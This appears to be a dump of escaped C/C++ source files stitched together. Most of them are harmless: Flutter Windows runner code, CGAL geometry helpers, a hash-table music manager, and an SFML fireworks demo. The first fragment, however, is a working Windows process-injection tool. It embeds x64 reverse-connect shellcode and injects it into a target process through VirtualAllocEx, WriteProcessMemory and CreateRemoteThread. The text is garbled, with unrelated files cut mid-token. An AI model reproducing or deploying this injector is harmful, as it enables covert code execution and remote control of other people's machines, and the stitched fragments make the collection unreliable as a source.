\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n\"\\x8b\\x52\\x20\\x51\\x56\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\"\n\"\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\"\n\"\\x74\\x67\\x48\\x01\\xd0\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\x50\\x8b\"\n\"\\x48\\x18\\xe3\\x56\\x4d\\x31\\xc9\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\"\n\"\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\"\n\"\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\"\n\"\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\"\n\"\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\"\n\"\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\"\n\"\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\"\n\"\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\"\n\"\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\"\n\"\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\x00\\x00\\x00\\x00\\x41\\x54\"\n\"\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\"\n\"\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\"\n\"\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\"\n\"\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\"\n\"\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\"\n\"\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\"\n\"\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\"\n\"\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\"\n\"\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\"\n\"\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\"\n\"\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\"\n\"\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\"\n\"\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\"\n\"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\"\n\"\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\"\n\"\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\"\n\"\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\"\n\"\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\xbb\\xe0\\x1d\"\n\"\\x2a\\x0a\\x41\\x89\\xda\\xff\\xd5\";\n\n\n\nint main(int argc, char* arg[])\n{\n\tif (argc < 2)\n\t{\n\t\tprintf(\"[-] Usage: %s <PID>\\n\", arg[0]);\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tPID = atoi(arg[1]);\n\tprintf(\"[+] PID: \", PID);\n\n\t// Opens handle TO A PROCESS \n\thProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);\n\tif (hProcess == NULL) {\n\t\tprintf(\"[-] Error: Unable to open process %d\\n\");//, PID, GetLastError());\n\t\tprintf(\"Error: \", GetLastError());\n\t\treturn EXIT_FAILURE;\n\t}\n\tprintf(\"[+] Hprocess \" , hProcess);\n\n\t;\n/*\n\t// rBuffer -> ALLOCATE MEMORY SPACE OF THE PAYLOAD, DOES NOT EXECUTE. \n\t// MEM_RESERVE -> RESERVES A RANGE OF THE PERESONS VERITUAL ADDRESS SPACE WITHOUT ACTUALLY ALLOCATING \n\t// MEM_COMMIT -> SETS ASIDE SPACE TO WRITE (DOES NOT WRITE) \n*/ \n\trBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT, MEM_RESERVE), PAGE_EXECUTE_READWRITE); \n\tif (rBuffer == NULL) {\n\t\tprintf(\"[-] Error in rBuffer \"); \n\t\tprintf(\"Error: \", GetLastError());\n\t}\n\n\tprintf(\"[+] rBuffer \", rBuffer, \"with  a permission of \", PAGE_EXECUTE_READWRITE, \"Memory Committed: \", MEM_COMMIT, \"Memory Reserved \", MEM_RESERVE);\n\tprintf(\"allocated size: \", sizeof(crowPuke)); \n\n\n\n\t// Write the allocated memory: insert payload (defined above) into memory \n\tWriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL); \n\n\t// Create thread to run payload \n\thThread = CreateRemoteThre",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"vector_algebra_utils.h\"\n\nnamespace\n{\nusing Matrix3 = std::array<std::array<double, 3>, 3>;\n\nMatrix3 getIdentityMatrix()\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = i == j ? 1.0 : 0.0;\n  return res;\n}\n\nMatrix3 getZeroMatrix()\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = 0.0;\n  return res;\n}\n\nAffine toAffine(const Matrix3& rotation)\n{\n  return Affine(rotation[0][0], rotation[0][1], rotation[0][2], rotation[1][0], rotation[1][1], rotation[1][2],\n                rotation[2][0], rotation[2][1], rotation[2][2], 1.);\n}\n\nAffine toAffine(const Matrix3& rotation, const Vector_3& translation)\n{\n  return Affine(rotation[0][0], rotation[0][1], rotation[0][2], translation[0], rotation[1][0], rotation[1][1],\n                rotation[1][2], translation[1], rotation[2][0], rotation[2][1], rotation[2][2], translation[2], 1.);\n}\n\nMatrix3 toRotation(const Affine& affine)\n{\n  Matrix3 res;\n  for (int i = 0; i < 3; i++)\n    for (int j = 0; j < 3; j++) res[i][j] = affine.m(i, j);\n  return res;\n}\n\nMatrix3 asymmetricTensorProduct(const Vector_3& x, const Vector_3& y)\n{\n  Matrix3 res;\n  for (int i = 0; i < 3; i++)\n    for (int j = 0; j < 3; j++) res[i][j] = x[i] * y[j] - x[j] * y[i];\n  return res;\n}\n\nMatrix3 operator+(const Matrix3& lhs, const Matrix3& rhs)\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = lhs[i][j] + rhs[i][j];\n  return res;\n}\n\nMatrix3 operator*(const Matrix3& lhs, const Matrix3& rhs)\n{\n  Matrix3 res = getZeroMatrix();\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++)\n      for (std::size_t k = 0; k < 3; k++) res[i][j] += lhs[i][k] * rhs[k][j];\n  return res;\n}\n\nMatrix3 operator*(const Matrix3& lhs, double rhs)\n{\n  Matrix3 res;\n  for (std::size_t i = 0; i < 3; i++)\n    for (std::size_t j = 0; j < 3; j++) res[i][j] = lhs[i][j] * rhs;\n  return res;\n}\n\n// fuzzy comparison ops using length threshold of eps\n\nbool isZero(double a, double eps) { return std::fabs(a) < std::fabs(eps); }\n\nbool isOne(double a, double eps) { return isZero(1. - std::fabs(a), eps); }\n\nbool pointsEqual(const Point_3& p, const Point_3& q, double eps) { return (p - q).squared_length() < eps * eps; }\n\nbool pointsCollinear(const Point_3& p, const Point_3& q, const Point_3& r, double eps)\n{\n  return CGAL::cross_product(q - p, r - p).squared_length() < eps * eps * eps * eps;\n}\n\n}  // namespace\n\n/* Returns the unit vector\n *\n * if input is 0 vector it returns the input\n *\n */\nVector_3 unitVector(const Vector_3& t)\n{\n  if (t == Vector_3(0, 0, 0)) return t;\n  return t / std::sqrt(t.squared_length());\n}\n\n/* Returns the centroid of the points\n *\n */\nPoint_3 getCentroid(const std::vector<Point_3>& points)\n{\n  if (points.empty()) return Point_3(0., 0., 0.);\n\n  if (points.size() == 1) return points[0];\n\n  Point_3 origin(0., 0., 0.);\n  Vector_3 center(0., 0., 0.);\n  for (const auto& p : points) center += (p - origin);\n  return origin + center / static_cast<double>(points.size());\n}\n\n/* computes the cos angle between vectors t1 and t2\n *\n */\nstd::optional<double> cosAngle(const Vector_3& t1, const Vector_3& t2, bool sign)\n{\n  Vector_3 zero(0, 0, 0);\n  if (t1 == zero || t2 == zero) return std::nullopt;\n  double ca = scalar_product(unitVector(t1), unitVector(t2));\n  return sign ? ca : std::fabs(ca);\n}\n\n/* Computes the cos of angle between vectors (p2-p1) and (p3-p2)\n *\n */\nstd::optional<double> cosAngle(Point_3 p1, Point_3 p2, Point_3 p3, bool sign)\n{\n  return cosAngle(unitVector(p2 - p1), unitVector(p3 - p2), sign);\n}\n\n/* Computes the difference vector\n *\n * Note that size of the output would be 1 less size of the input\n *\n */\ntemplate <class T, class S>\nvoid getDifference(const T& in, S& out)\n{\n  out.clear();\n  for (size_t i = 0; i < in.size() - 1; i++) out.push_back(in[i + 1] - in[i]);\n}\n\n/* Projects a vector onto a plane specified by the normal n\n *\n */\nVector_3 projectVector2Plane(const Vector_3& n, const Vector_3& v) { return v - scalar_product(v, n) * n; }\n\n/* returns a rotation that takes vector \"a\" (direction only) a to vector \"b\" (direction only)\n *\n *\n */\nstd::optional<Affine> getRotation(const Vector_3& a, const Vector_3& b)\n{\n  if (a == Vector_3(0, 0, 0) || b == Vector_3(0, 0, 0)) return std::nullopt;\n\n  Vector_3 m = unitVector(a);\n  Vector_3 n = unitVector(b);\n\n  if (m == -n) return std::nullopt;\n\n  if (m == n) return toAffine(getIdentityMatrix());\n\n  Vector_3 mxn = CGAL::cross_product(m, n);\n  double s2 = mxn.squared_length();\n  if (s2 > 0)\n  {\n    Vector_3 x = m;\n    Vector_3 y = n;\n\n    double factor = 1.0 / (1.0 + CGAL::scalar_product(x, y));\n    const auto S = asymmetricTensorProduct(y, x);\n    const auto SS = S * S;\n    const auto R = getIdentityMatrix() + S + SS * factor;\n\n    return toAffine(R);\n  }\n\n  return toAffine(getIdentityMatrix());\n}\n\nstd::optional<Affine> alignAndTranslate(const Vector_3& reference, const Vector_3& targ",
    "#include<iostream>\r\nusing namespace std;\r\nint key[30],c[30],n ,m;\r\nint i;\r\nclass Music\r\n{\r\n    public:\r\n    int tc;\r\n    string name,singer,composer;\r\n    float p;\r\n    void declare();\r\n    void htable();\r\n    void accept();\r\n    void search();\r\n    void Delete();\r\n    void update();\r\n}h[100];\r\nvoid Music :: declare()\r\n{   \r\n    cout<<\"Enter total number of key : \";\r\n    cin>>n;\r\n    cout<<\"Enter Keys :  \";\r\n    for(i=0;i<n;i++)\r\n    {\r\n        cin>>key[i];\r\n    }\r\n    for(i=0;i<10;i++)\r\n    {\r\n        h[i].tc=-1;\r\n        c[i]=0;\r\n    }\r\n}\r\nvoid Music :: htable()\r\n{\r\n    cout<<\"\\ntrac_id\\tname\\tsinger\\tcomposer\\tChain\";\r\n    for(i=0;i<10;i++)\r\n    {\r\n    cout<<\"\\n\"<<h[i].tc<<\"\\t\"<<h[i].name<<\"\\t\"<<h[i].singer<<\"\\t\"<<h[i].composer<<\"\\t\\t\r\n    \"<<c[i];\r\n    }\r\n}\r\nvoid Music :: accept()\r\n{\r\n    int no,pos;\r\n    for(i=0;i<n;i++)\r\n    {\r\n        no=key[i]%10;\r\n        pos=no;\r\n        do{\r\n            if(h[no].tc==-1)\r\n            {\r\n                h[no].tc=key[i];\r\n                cout<<\"Name : \";\r\n                cin>>h[no].name;\r\n                cout<<\"Singer : \";\r\n                cin>>h[no].singer;\r\n                cout<<\"Composer : \";\r\n                cin>>h[no].composer;\r\n                break;\r\n            }\r\n            else \r\n            {\r\n                no++;\r\n                c[pos]=no;\r\n                \r\n            }\r\n        }while(no<10);\r\n    }\r\n\r\n}\r\nvoid Music :: search()\r\n{\r\n    int no,pos,id,found=0;\r\n    cout<<\"Enter trac_id to search : \";\r\n    cin>>id;\r\n    for(i=0;i<n;i++)\r\n    {\r\n        no=id%10;\r\n        pos=no;\r\n        do{\r\n            if(h[no].tc==id)\r\n            {\r\n             \r\n                found=1;\r\n                     break;\r\n            }\r\n            else \r\n            {\r\n                no++;\r\n                c[pos]=no;\r\n                \r\n                \r\n            }\r\n        }while(no<10);\r\n    }\r\n    if(found==1)\r\n    {\r\n        cout<<\"\\ntrac_id\\tname\\tsinger\\tcomposer\\tChain\";\r\n        cout<<\"\\n\"<<h[no].tc<<\"\\t\"<<h[no].name<<\"\\t\"<<h[no].singer<<\"\\t\"<<h[no].composer<<\"\\t\"<<c[no];\r\n    }\r\n    else\r\n    {\r\n        cout<<\"\\nRecord not found\";\r\n    }\r\n}\r\nvoid Music :: update()\r\n{\r\n    int no,pos,id,found=0;\r\n    cout<<\"Enter music_id to update : \";\r\n    cin>>id;\r\n    for(i=0;i<n;i++)\r\n    {\r\n        no=id%10;\r\n        pos=no;\r\n        do{\r\n            if(h[no].tc==id)\r\n            {\r\n                \r\n                found=1;\r\n                     break;\r\n            }\r\n            else \r\n            {\r\n                no++;\r\n                c[pos]=no;\r\n                if(no>10)\r\n                {\r\n                    no=0;\r\n                }\r\n                \r\n            }\r\n        }while(no<10);\r\n    }\r\n    if(found==1)\r\n    {\r\n                \r\n                cout<<\"Trac_id : \";\r\n                cin>>h[no].tc;\r\n                cout<<\"Name : \";\r\n                cin>>h[no].name;\r\n                cout<<\"Singer : \";\r\n                cin>>h[no].singer;\r\n                cout<<\"Composer : \";\r\n                cin>>h[no].composer;\r\n    }\r\n    else\r\n    {\r\n        cout<<\"\\nRecord not found\";\r\n    }\r\n}\r\nvoid Music::Delete() {\r\n    int no, pos, id, found = 0, it = -1;\r\n    int m=10;\r\n    cout << \"Enter trac_id to delete: \";\r\n    cin >> id;\r\n\r\n    for (int i = 0; i < n; i++) {\r\n        no = id % 10;\r\n        pos = no;\r\n        \r\n        do {\r\n            if (h[no].tc == id) {\r\n                found = 1;\r\n       \r\n                \r\n                break;\r\n\r\n            } \r\n            else {\r\n                no++;\r\n            \r\n                c[pos] = no;\r\n            }\r\n        } while (no <10);\r\n    }\r\n    \r\nif(found==1)\r\n{\r\n   h[no].tc=-1;\r\n          h[no].name=\"\";\r\n          h[no].singer=\"\";\r\n          h[no].composer=\"\";\r\n}\r\n    if (found == 0) {\r\n      \r\n        cout << \"Record not found.\" << endl;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int ch;\r\n    Music s;\r\n     \r\n    do\r\n    {\r\n        cout<<\"\\n..........MUSIC MANAGEMENT SYSTEM..........\";\r\n        cout<<\"\\n1.declare\\n2.ADD RECORD\\n3.DISPLAY RECORD\\n4.search\\n5.delete\\n6.update\\n7.exit\";\r\n\r\n        cout<<\"\\nEnter your choice : \";\r\n        cin>>ch;\r\n        switch(ch)\r\n        {\r\n         \r\n            case 1:\r\n            s.declare();\r\n            break;\r\n            case 2:\r\n            s.accept();\r\n            break;\r\n            case 3:\r\n            s.htable();\r\n            break;\r\n            case 4:\r\n            s.search();\r\n            break;\r\n            case 5:\r\n            s.Delete();\r\n            break;\r\n            case 6:\r\n            s.update();\r\n            break;\r\n            case 7:\r\n            cout<<\"Exit......!!\";\r\n            break;\r\n            default:\r\n            cout<<\"Wrong choice\";\r\n        }\r\n    } while (ch!=7);\r\n    return 0;\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"lesson_27\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include \"firework.h\"\n\nconstexpr float gravity = 500.0f;\n\nint main() {\n    sf::ContextSettings settings;\n    settings.antialiasingLevel = 8;\n\n    sf::RenderWindow window(sf::VideoMode(1600, 900), \"SpaceBar to clear screen\", sf::Style::Close, settings);\n    window.setFramerateLimit(120);\n\n    sf::Font font;\n    font.loadFromFile(\"OpenSans-Regular.ttf\");\n\n    sf::Text fpsText;\n    fpsText.setFont(font);\n    fpsText.setCharacterSize(36); \n    fpsText.setFillColor(sf::Color::Red);\n    fpsText.setPosition(10, 10);\n\n    sf::Event event;\n\n    sf::Clock fpsClock;\n    unsigned int frameCount = 0;\n    sf::Clock deltaClock;\n    float dt = 1.0f / 60.0f; // 1/60 seconds\n\n    //this is to render texture for the fireworks\n    sf::RenderTexture fadeTexture;\n    fadeTexture.create(1600, 900);\n\n    sf::CircleShape blastBoom; // this represents the blast\n    blastBoom.setRadius(50);\n    blastBoom.setPointCount(100);\n\n    std::vector<Firework> Fireworks; // store alr drawn fireworks\n    std::vector<Firework> FireWorksAftermath; // store the effects of splash\n\n    bool MousePressed = false;\n    bool SpacePressed = false;\n\n    while (window.isOpen()) {\n        while (window.pollEvent(event)) {\n            switch (event.type) {\n            case sf::Event::Closed:\n                window.close();\n                break;\n            case sf::Event::MouseButtonPressed:\n                if (event.mouseButton.button == sf::Mouse::Left) {\n                    sf::Vector2f mousePos(sf::Mouse::getPosition(window)); //mouse pos relative to current active window\n\n                    Fireworks.emplace_back\n                    (\n                        (float)randomInt(12, 16),\n                        sf::Vector2f(mousePos.x, mousePos.y), //  use mouse position without offset\n                        sf::Vector2f{},\n                        sf::Color((sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255))\n                    );\n\n                    MousePressed = true;\n                }\n                break; //these needs to go both ways\n            case sf::Event::KeyPressed:\n                if (event.key.code == sf::Keyboard::Space) {\n                    Fireworks.clear();\n                    FireWorksAftermath.clear();\n                    fadeTexture.clear();\n                    SpacePressed = true; \n                }\n                break;\n            case sf::Event::KeyReleased:\n                if (event.key.code == sf::Keyboard::Space) {\n                    SpacePressed = false; \n                }\n                break;\n            }\n        }\n\n        window.clear();\n\n        if (!SpacePressed) {\n            static float fadeElapsedTime = 0.0f;\n            fadeElapsedTime += dt;\n\n            if (!Fireworks.empty()) { //if not empty we loop and continusely draw\n                for (size_t i = 0; i < Fireworks.size(); i++) {\n                    auto& current = Fireworks[i];\n\n                    current.Velocity.y += gravity * dt;\n\n                    if (current.Velocity.y > 0.0f) {\n                        createExplosion(FireWorksAftermath, current);\n\n                        Fireworks.erase(Fireworks.begin() + i);\n                        i--;\n                        continue;\n                    